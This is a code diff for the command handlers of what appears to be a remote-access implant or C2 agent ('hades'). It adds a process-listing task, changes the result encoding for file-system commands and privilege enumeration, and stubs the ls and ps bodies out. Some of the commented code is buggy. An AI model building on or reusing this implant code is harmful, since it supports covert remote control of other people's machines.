@@ -33,6 +33,9 @@ BOOL commanders::Dispatch(PBYTE Data, UINT size, PBYTE OutBuffer) {
 		UINT CmdCode = g_ByteMgr->Read4();
 		switch (CmdCode)
 		{
+		case CMD_CODE_PS:
+			do_ps();
+			break;
 		case CMD_CODE_LS:
 			do_ls();
 			break;
@@ -123,6 +126,9 @@ void commanders::do_getprivs() {
 		goto CLEANUP;
 	}
 
+	g_ByteMgr->Write4(STATUS_OK);
+	g_ByteMgr->Write4(TASK_TYPE_LS);
+	g_ByteMgr->Write4(TokenPrivs->PrivilegeCount);
 	for (DWORD i = 0; i < TokenPrivs->PrivilegeCount; i++) {
 		LUID_AND_ATTRIBUTES Priv = TokenPrivs->Privileges[i];
 
@@ -136,7 +142,7 @@ void commanders::do_getprivs() {
 		const char* Status;
 		if (Priv.Attributes & SE_PRIVILEGE_REMOVED) {
 			Status = "Removed"; StatusLen = 7;
-		} 
+		}
 		else if (Priv.Attributes & SE_PRIVILEGE_ENABLED) {
 			Status = "Enabled"; StatusLen = 7;
 		}
@@ -146,23 +152,12 @@ void commanders::do_getprivs() {
 		else {
 			Status = "Disabled"; StatusLen = 8;
 		}
+		g_ByteMgr->Write4(NameLne);
+		g_ByteMgr->WriteString((PBYTE)name, NameLne);
+		g_ByteMgr->Write4(StatusLen);
+		g_ByteMgr->WriteString((PBYTE)Status, StatusLen);
 
-		char merged[512];
-		DWORD entryLen = NameLne + 1 + StatusLen;
-		memcpy(merged, name, NameLne);
-		merged[NameLne] = ' ';
-		memcpy(merged + NameLne + 1, Status, StatusLen);
-		merged[entryLen] = '\n';
-		
-		if (TotalSize + entryLen + 1 > capacity) {
-			capacity *= 2;
-			buf = (PCHAR)HeapReAlloc(GetProcessHeap(), 0, buf, capacity);
-		}
-		memcpy(buf + TotalSize, merged, entryLen + 1);
-		TotalSize += entryLen + 1;
 	}
-	if (TotalSize > 0) { buf[TotalSize - 1] = '\0'; }
-	g_ByteMgr->EndOkData((PBYTE)buf, TotalSize);
 	
 CLEANUP:
 	
@@ -195,7 +190,7 @@ void commanders::do_cat() {
 	buf = AllocMemory<BYTE>(ChunkSize);
 	Result = hades->WinApis.ReadFile(hFile, (PBYTE)buf, ChunkSize, &BytesRead, NULL);
 	if (Result) {
-		g_ByteMgr->EndOkData(buf, BytesRead);
+		g_ByteMgr->EndOkData(TASK_TYPE_NO_PARSE, BytesRead, buf);
 		goto CLEANUP;
 	}
 	else {
@@ -217,81 +212,92 @@ CLEANUP:
 
 
 void commanders::do_ls() {
-	WIN32_FIND_DATAA FindData;
-	HANDLE hFind = NULL;
-	
-	DWORD typeLen;
-	DWORD BufSize   = 12 * 1024;
-	DWORD TotalSize = 0;
-	DWORD Namelen   = 0;
-	DWORD EntryLen  = 0;
-	DWORD PathSize  = 0;
-
-	char path[MAX_PATH];
-	const char* type;
-	g_ByteMgr->BeginTask();
-
-	UINT len = g_ByteMgr->Read4();
-	PCHAR Dir = g_ByteMgr->ReadString(len);
-	PBYTE buf = AllocMemory<BYTE>(BufSize);
-	if (!buf) {
-		g_ByteMgr->EndErr(ERROR_OUT_OF_MEMORY);
-		goto CLEANUP;
-	}
-
-	
-	PathSize = GetFullPathNameA(Dir, MAX_PATH, path, NULL);
-	path[PathSize] = '\\';
-	path[++PathSize] = '*';
-	path[++PathSize] = '\0';
-
-	hFind = hades->WinApis.FindFirstFileA(path, &FindData);
-	if (!hFind || hFind == INVALID_HANDLE_VALUE) {
-		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
-		goto CLEANUP;
-	}
-
-	do {
-		if (strcmp(FindData.cFileName, "..") == 0 || strcmp(FindData.cFileName, ".") == 0) {
-			continue;
-		}
-		if (FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
-			type = "DIR"; typeLen = 3;
-		}
-		else if (FindData.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) {
-			type = "LINK", typeLen = 4;
-		}
-		else {
-			type = "FILE"; typeLen = 4;
-		}
-
-		Namelen = (DWORD)strlen(FindData.cFileName);
-		EntryLen = Namelen + 1 + typeLen;
-
-		if (TotalSize + EntryLen + 1 > BufSize) {
-			DWORD NewCap = BufSize * 2;
-			while (NewCap < TotalSize + EntryLen + 1) NewCap *= 2;
-			PBYTE newBuf = (PBYTE)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, buf, NewCap);
-			buf = newBuf;
-			BufSize = NewCap;
-		}
-
-		memcpy(buf + TotalSize, FindData.cFileName, Namelen);
-		buf[TotalSize + Namelen] = ' ';
-		memcpy(buf + TotalSize + Namelen + 1, type, typeLen);
-		buf[TotalSize + EntryLen] = '\n';
-		TotalSize += EntryLen + 1;
-
-	} while (hades->WinApis.FindNextFileA(hFind, &FindData));
-
-	if (TotalSize > 0) { buf[TotalSize + EntryLen] = '\0'; }
-	g_ByteMgr->EndOkData(buf, TotalSize);
-
-CLEANUP:
-	if (Dir) { g_ByteMgr->FreeString(Dir); }
-	if (buf) { HeapFree(GetProcessHeap(), 0, buf); }
-
+	return;
 }
+
+//	WIN32_FIND_DATAA FindData;
+//	HANDLE hFind = NULL;
+//	
+//	DWORD typeLen;
+//	DWORD BufSize   = 12 * 1024;
+//	DWORD TotalSize = 0;
+//	DWORD Namelen   = 0;
+//	DWORD EntryLen  = 0;
+//	DWORD PathSize  = 0;
+//
+//	char path[MAX_PATH];
+//	const char* type;
+//	g_ByteMgr->BeginTask();
+//
+//	UINT len = g_ByteMgr->Read4();
+//	PCHAR Dir = g_ByteMgr->ReadString(len);
+//	PBYTE buf = AllocMemory<BYTE>(BufSize);
+//	if (!buf) {
+//		g_ByteMgr->EndErr(ERROR_OUT_OF_MEMORY);
+//		goto CLEANUP;
+//	}
+//
+//	
+//	PathSize = GetFullPathNameA(Dir, MAX_PATH, path, NULL);
+//	path[PathSize] = '\\';
+//	path[++PathSize] = '*';
+//	path[++PathSize] = '\0';
+//
+//	hFind = hades->WinApis.FindFirstFileA(path, &FindData);
+//	if (!hFind || hFind == INVALID_HANDLE_VALUE) {
+//		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
+//		goto CLEANUP;
+//	}
+//
+//	do {
+//		if (strcmp(FindData.cFileName, "..") == 0 || strcmp(FindData.cFileName, ".") == 0) {
+//			continue;
+//		}
+//		if (FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
+//			type = "DIR"; typeLen = 3;
+//		}
+//		else if (FindData.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) {
+//			type = "LINK", typeLen = 4;
+//		}
+//		else {
+//			type = "FILE"; typeLen = 4;
+//		}
+//
+//		
+//		DWORD padding = 1;
+//		Namelen = (DWORD)strlen(FindData.cFileName);
+//		if (Namelen < COL_WIDTH) padding = COL_WIDTH - Namelen;
+//
+//		
+//
+//		if (TotalSize + EntryLen + 1 > BufSize) {
+//			DWORD NewCap = BufSize * 2;
+//			while (NewCap < TotalSize + EntryLen + 1) NewCap *= 2;
+//			PBYTE newBuf = (PBYTE)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, buf, NewCap);
+//			buf = newBuf;
+//			BufSize = NewCap;
+//		}
+//		DWORD pos = TotalSize;
+//		memcpy(buf + pos, FindData.cFileName, Namelen);
+//		pos += Namelen;
+//		memset(buf + pos, ' ', padding);
+//		pos += padding;
+//		memcpy(buf + pos, type, typeLen);
+//		pos += Namelen;
+//
+//		buf[pos++] = '\n';
+//		TotalSize = pos;
+//
+//	} while (hades->WinApis.FindNextFileA(hFind, &FindData));
+//
+//	if (TotalSize > 0) { buf[TotalSize + EntryLen] = '\0'; }
+//	g_ByteMgr->EndOkData(buf, TotalSize);
+//
+//CLEANUP:
+//	if (Dir) { g_ByteMgr->FreeString(Dir); }
+//	if (buf) { HeapFree(GetProcessHeap(), 0, buf); }
+//
+//}
 
 void commanders::do_cp() {
 	g_ByteMgr->BeginTask();
@@ -306,7 +312,7 @@ void commanders::do_cp() {
 		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
 		goto CLEANUP;
 	}
-	g_ByteMgr->EndErr(CP_SUCCESS);
+	g_ByteMgr->EndOk(CP_SUCCESS);
 CLEANUP:
 	if (src) { g_ByteMgr->FreeString(src); }
 	if (dst) { g_ByteMgr->FreeString(dst); }
@@ -325,7 +331,7 @@ void commanders::do_rmdir() {
 		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
 		goto CLEANUP;
 	}
-	g_ByteMgr->EndErr(RMDIR_SUCCESS);
+	g_ByteMgr->EndOk(RMDIR_SUCCESS);
 
 CLEANUP:
 	if (DirName) { g_ByteMgr->FreeString(DirName); }
@@ -343,7 +349,7 @@ void commanders::do_mkdir() {
 		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
 		goto CLEANUP;
 	}
-	g_ByteMgr->EndErr(MKDIR_SUCCESS);
+	g_ByteMgr->EndOk(MKDIR_SUCCESS);
 
 CLEANUP:
 	if (Name) { g_ByteMgr->FreeString(Name); }
@@ -359,7 +365,7 @@ void commanders::do_rm() {
 		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
 		goto CLEANUP;
 	}
-	g_ByteMgr->EndErr(RM_SUCCESS);
+	g_ByteMgr->EndOk(RM_SUCCESS);
 
 CLEANUP:
 	if (FileName) { g_ByteMgr->FreeString(FileName); }
@@ -376,7 +382,7 @@ void commanders::do_cd() {
 		goto CLEANUP;
 	}
 
-	g_ByteMgr->EndErr(CD_SUCCESS);
+	g_ByteMgr->EndOk(CD_SUCCESS);
 CLEANUP:
 	if (dir) { g_ByteMgr->FreeString(dir); }
 	return;
@@ -402,7 +408,7 @@ void commanders::do_pwd() {
 	}
 
 
-	g_ByteMgr->EndOkData((PBYTE)buf, Res);
+	g_ByteMgr->EndOkData(TASK_TYPE_NO_PARSE, Res, (PBYTE)buf);
 
 CLEANUP:
 	if (buf) { HeapFree(GetProcessHeap(), 0, buf); }
@@ -423,7 +429,7 @@ void commanders::do_mv() {
 		g_ByteMgr->EndErr(GetTeb()->LastErrorValue);
 		goto CLEANUP;
 	}
-	g_ByteMgr->EndErr(MV_SUCCESS);
+	g_ByteMgr->EndOk(MV_SUCCESS);
 
 CLEANUP:
 	if (src) { g_ByteMgr->FreeString(src); };
@@ -432,6 +438,89 @@ CLEANUP:
 
 }
 
+
+//
+void commanders::do_ps() {
+	return;
+}
+//	NTSTATUS stat;
+//	ULONG size = 0;
+//	PSYSTEM_PROCESS_INFORMATION spi = NULL;
+//
+//	PBYTE buf    = NULL;
+//	PBYTE OutBuf = NULL;
+//
+//	DWORD capacity = BASE_BUFFER_SIZE;
+//	DWORD used = 0;
+//	DWORD PID = 0;
+//	INT pidlen = 0;
+//	INT len = 0;
+//
+//	g_ByteMgr->BeginTask();
+//
+//	hades->NtApis.NtQuerySystemInformation(SystemProcessInformation, NULL, 0, &size);
+//	buf = AllocMemory<BYTE>(size);
+//	OutBuf = AllocMemory<BYTE>(capacity);
+//
+//	if (!buf || !OutBuf) {
+//		g_ByteMgr->EndErr(ERROR_OUT_OF_MEMORY);
+//		goto CLEANUP;
+//	}
+//	
+//	stat = hades->NtApis.NtQuerySystemInformation(SystemProcessInformation, buf, size, &size);
+//	if (NTAPI_SUCCESS(stat)) {
+//		g_ByteMgr->EndErr(ERROR_PS_LIST);
+//		goto CLEANUP;
+//	}
+//
+//	spi = (PSYSTEM_PROCESS_INFORMATION)buf;
+//
+//	while (TRUE) {
+//		CHAR line[512] = { 0 };
+//		DWORD pos = 0;
+//		if (!spi->ImageName.Buffer) {
+//			goto NEXT_ENTRY;
+//		} 
+//		len = WideCharToMultiByte(CP_UTF8, 0, spi->ImageName.Buffer, spi->ImageName.Length / sizeof(WCHAR), line, sizeof(line) - 32, NULL, NULL);
+//		if (len <= 0) {
+//			goto NEXT_ENTRY;
+//		}
+//		pos += len;
+//
+//		line[pos++] = ' ';
+//		PID = (DWORD)(ULONG_PTR)spi->UniqueProcessId;
+//		CHAR pidStr[16];
+//		pidlen = IntToStr(PID, pidStr);
+//		memcpy(line + pos, pidStr, pidlen);
+//		pos += pidlen;
+//		line[pos++] = '\n';
+//		if (used + pos + 1 > capacity) {
+//			DWORD newCap = capacity * 2;
+//			while (newCap < used + pos + 1) newCap *= 2;
+//			PBYTE newBuf = (PBYTE)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, OutBuf, newCap);
+//			if (!newBuf) {
+//				g_ByteMgr->EndErr(ERROR_OUT_OF_MEMORY);
+//				goto CLEANUP;
+//			}
+//			OutBuf = newBuf;
+//			capacity = newCap;
+//		}
+//		memcpy(OutBuf + used, line, pos);
+//		used += pos;
+//		OutBuf[used] = '\0';
+//	NEXT_ENTRY:
+//		if (spi->NextEntryOffset == NULL) break;
+//		spi = (PSYSTEM_PROCESS_INFORMATION)((PBYTE)spi + spi->NextEntryOffset);
+//		
+//
+//	}
+//	g_ByteMgr->EndOkData(OutBuf, used);
+//CLEANUP:
+//	if (buf) { HeapFree(GetProcessHeap(), 0, buf); }
+//	if (OutBuf) { HeapFree(GetProcessHeap(), 0, OutBuf); }
+//
+//
+//}
 
 
 
